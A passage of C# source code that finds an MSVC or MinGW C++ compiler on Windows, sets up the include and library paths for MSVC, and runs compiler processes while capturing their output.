                Arguments = "-latest -products * -requires Microsoft.VisualCpp.Tools.HostX64.TargetX64 -find VC\\Tools\\MSVC\\**\\bin\\HostX64\\x64\\cl.exe",
                RedirectStandardOutput = true, UseShellExecute = false, CreateNoWindow = true
            };
            using var p = System.Diagnostics.Process.Start(psi);
            var path = p?.StandardOutput.ReadToEnd().Trim().Split('\n').LastOrDefault(x => x.Contains("cl.exe"))?.Trim();
            if (!string.IsNullOrEmpty(path) && File.Exists(path)) return (path, true);
        }
        // 2. Scan common VS paths for cl.exe
        foreach (var ver in new[] { "2022", "2019", "2017" })
        foreach (var ed  in new[] { "Enterprise", "Professional", "Community", "BuildTools" })
        foreach (var pf  in new[] { Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles),
                                    Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86) })
        {
            var root = Path.Combine(pf, "Microsoft Visual Studio", ver, ed);
            if (!Directory.Exists(root)) continue;
            var cl = Directory.GetFiles(root, "cl.exe", SearchOption.AllDirectories)
                              .FirstOrDefault(f => f.Contains("HostX64") && f.Contains("x64"));
            if (cl != null) return (cl, true);
        }
        // 3. Try g++ (MinGW / MSYS2 / Git for Windows)
        foreach (var gpp in new[] { "g++", "x86_64-w64-mingw32-g++" })
        {
            try
            {
                var test = new System.Diagnostics.ProcessStartInfo
                {
                    FileName = gpp, Arguments = "--version",
                    RedirectStandardOutput = true, RedirectStandardError = true,
                    UseShellExecute = false, CreateNoWindow = true
                };
                using var p = System.Diagnostics.Process.Start(test);
                p?.WaitForExit(3000);
                if (p?.ExitCode == 0) return (gpp, false);
            }
            catch { }
        }
        // 4. Check common MinGW install paths
        foreach (var mingwRoot in new[] {
            @"C:\mingw64\bin", @"C:\msys64\mingw64\bin", @"C:\msys64\ucrt64\bin",
            @"C:\Program Files\mingw-w64\x86_64-8.1.0-posix-seh-rt_v6-rev0\mingw64\bin",
            Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), @"Programs\mingw64\bin")
        })
        {
            var gpp = Path.Combine(mingwRoot, "g++.exe");
            if (File.Exists(gpp)) return (gpp, false);
        }
        return (string.Empty, false);
    }

    private static void SetMsvcEnv(System.Diagnostics.ProcessStartInfo psi, string clExe)
    {
        // Derive include and lib paths from cl.exe location
        // cl.exe is at: ..\VC\Tools\MSVC\<ver>\bin\HostX64\x64\cl.exe
        try
        {
            var binDir   = Path.GetDirectoryName(clExe)!; // HostX64\x64
            var msvcDir  = Path.GetFullPath(Path.Combine(binDir, "..", "..", "..", "..")); // MSVC\<ver>
            var include  = Path.Combine(msvcDir, "include");
            var lib      = Path.Combine(msvcDir, "lib", "x64");

            // Windows SDK (look for latest)
            var sdkRoot = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFilesX86),
                "Windows Kits", "10");
            string sdkInc = "", sdkLib = "";
            if (Directory.Exists(Path.Combine(sdkRoot, "Include")))
            {
                var sdkVer = Directory.GetDirectories(Path.Combine(sdkRoot, "Include"))
                                      .OrderByDescending(d => d).FirstOrDefault();
                if (sdkVer != null)
                {
                    sdkInc = $"{sdkVer}\\um;{sdkVer}\\shared;{sdkVer}\\ucrt";
                    var libVer = Path.Combine(sdkRoot, "Lib", Path.GetFileName(sdkVer));
                    if (Directory.Exists(libVer))
                        sdkLib = $"{libVer}\\um\\x64;{libVer}\\ucrt\\x64";
                }
            }

            psi.Environment["INCLUDE"] = $"{include};{sdkInc}";
            psi.Environment["LIB"]     = $"{lib};{sdkLib}";
            psi.Environment["PATH"]    = $"{binDir};{Environment.GetEnvironmentVariable("PATH")}";
        }
        catch { /* if paths fail, cl.exe will error with missing headers */ }
    }

    private static async Task<(int code, string output)> RunProcessAsync(System.Diagnostics.ProcessStartInfo psi)
    {
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError  = true;
        psi.UseShellExecute  = false;
        psi.CreateNoWindow   = true;
        using var p = System.Diagnostics.Process.Start(psi)!;
        var o = p.StandardOutput.ReadToEndAsync();
        var e = p.StandardError.ReadToEndAsync();
        await p.WaitForExitAsync();
        return (p.ExitCode, await o + await e);
    }
}
